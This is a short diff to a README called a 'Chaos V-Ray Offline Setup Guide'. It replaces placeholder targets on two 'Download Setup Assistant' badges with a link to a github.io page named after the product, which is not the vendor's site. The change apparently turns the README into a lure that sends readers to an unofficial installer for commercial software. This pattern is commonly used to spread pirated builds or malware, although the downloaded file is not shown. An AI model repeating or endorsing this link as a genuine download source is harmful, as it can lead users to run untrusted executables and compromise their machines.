@@ -1,6 +1,6 @@
 # Chaos V-Ray — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://chaos-v-ray.github.io/.github)
 
 ---
 
@@ -24,7 +24,7 @@
 
 ---
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://chaos-v-ray.github.io/.github)
 
 ---
 
